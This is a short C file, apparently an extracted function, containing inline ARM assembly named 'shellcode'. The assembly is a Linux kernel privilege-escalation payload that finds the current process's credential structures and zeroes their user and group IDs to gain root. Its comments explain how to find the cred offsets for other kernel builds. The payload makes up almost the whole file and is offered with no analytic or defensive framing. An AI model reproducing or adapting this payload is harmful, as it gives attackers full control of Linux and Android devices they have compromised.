#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */

void __attribute__((regparm(3))) shellcode(void)
{
	asm volatile(

		"__transgressor:;"
		"push	{r0-r12,lr}"		"\n\t"
		"mov	r1, sp"			"\n\t" /* calculate the process descriptor location */
		"bic	r2, r1, #8128"		"\n\t"
		"bic	r2, r2, #63"		"\n\t"
		"ldr	r3, [r2, #12]"		"\n\t"
		
		"movt	r0, #0"			"\n\t"
		"movw	r0, #0"			"\n\t"

		"ldr    r1, [r3, #492]" 	"\n\t"	/* cred's location may differ depending on the kernel config. 
							 * just build and objdump a kernel module with printk(current->cred->uid)
							 * to find out. or pinpoint it with the help of kgdb or whatever ;)
							 */
		"mov	r4, #8"			"\n\t"
		"__loop_cred:;"
		"sub	r4, r4, #1"		"\n\t"
		"str	r0, [r1, #4]!"		"\n\t"
		"teq	r4, #0"			"\n\t"
		"bne	__loop_cred"		"\n\t"

		"ldr	r1, [r3, #488]"		"\n\t"	/* real_cred. overkill? */
		"mov	r4, #8"			"\n\t"
		"__loop_real_cred:;"
		"sub	r4, r4, #1"		"\n\t"
		"str 	r0, [r1, #4]!"		"\n\t"
		"teq	r4, #0"			"\n\t"
		"bne	__loop_real_cred"	"\n\t"

		"ldm	sp!, {r0-r12,pc}"	"\n\t" /* return to ret_fast_syscall */
		"mov	pc, lr"			"\n\t"
	);
}